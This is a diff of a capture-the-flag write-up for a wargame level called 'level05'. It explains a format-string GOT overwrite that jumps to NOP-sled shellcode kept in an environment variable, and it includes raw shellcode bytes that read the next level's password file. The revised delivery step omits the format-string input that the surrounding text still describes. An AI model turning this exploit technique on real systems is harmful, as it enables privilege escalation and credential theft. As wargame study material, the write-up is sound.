@@ -28,13 +28,13 @@ Same open/read/write shellcode as level04 (74 bytes, no 0x0a), targeting `/home/
 EGG = "\x90" * 200 + shellcode   (274 bytes)
 ```
 
-EGG address in the `bash -c 'printf ... | ./level05'` context: **`0xffffddc5`**
+EGG address when invoked as `env -i EGG=... /home/users/level05/level05`: **`0xFFFFDEC9`**
 
-Return target = `0xffffddc5 + 100 = 0xffffde29` (middle of NOP sled)
+Return target = `0xFFFFDEC9 + 100 = 0xFFFFDF2D` (middle of NOP sled)
 
 ### 2. Format String GOT Overwrite
 
-**Target**: `exit@got = 0x080497e0` — overwrite with `0xffffde29` (EGG+100)
+**Target**: `exit@got = 0x080497e0` — overwrite with `0xFFFFDF2D` (EGG+100)
 
 Buffer is at **vararg position 10** (confirmed via `%p` leak).
 
@@ -43,18 +43,18 @@ Format string layout (38 bytes, all safe from uppercase conversion):
 ```
 \xe0\x97\x04\x08   <- exit@got low word addr  (position 10)
 \xe2\x97\x04\x08   <- exit@got high word addr (position 11)
-%10$056865d        <- emit 56865 chars (total = 8+56865 = 56873 = 0xde29)
-%10$hn             <- write 0xde29 to exit@got[0:2]
-%11$08662d         <- emit 8662 more chars (total = 65535 = 0xffff)
-%11$hn             <- write 0xffff to exit@got[2:4]
+%10$0<pad1>d       <- emit (lo - 8) chars to reach low 16 bits of ret addr
+%10$hn             <- write low 16 bits to exit@got[0:2]
+%11$0<pad2>d       <- emit (hi - lo) more chars to reach high 16 bits
+%11$hn             <- write high 16 bits to exit@got[2:4]
 ```
 
-Result: `exit@got = 0xffffde29` -> jumps to NOP sled -> shellcode
+Result: `exit@got = 0xFFFFDF2D` -> jumps to NOP sled -> shellcode
 
 ### 3. Delivery
 
 ```bash
-EGG=$'<nop+shellcode>' bash -c 'printf "<format_string>" | ./level05'
+env -i EGG=$'<nop+shellcode>' /home/users/level05/level05
 ```
 
 `printf` outputs ~65KB of padding; the password is appended at the very end by the shellcode's `write(1, ...)` syscall.
@@ -65,8 +65,8 @@ EGG=$'<nop+shellcode>' bash -c 'printf "<format_string>" | ./level05'
 |---------------|--------------|
 | exit@got      | 0x080497e0   |
 | libc base     | 0xf7e4e000   |
-| EGG (NOP+SC)  | 0xffffddc5   |
-| Return addr   | 0xffffde29   |
+| EGG (NOP+SC)  | 0xFFFFDEC9   |
+| Return addr   | 0xFFFFDF2D   |
 
 ## Actual command
 export EGG=$(python -c 'import sys; sys.stdout.write("\x90"*200+"\xeb\x29\x5b\x31\xc0\xb0\x05\x31\xc9\x31\xd2\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x89\xe1\xb2\x40\xcd\x80\x89\xc2\x31\xc0\xb0\x04\x31\xdb\x43\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xd2\xff\xff\xff/home/users/level06/.pass")')
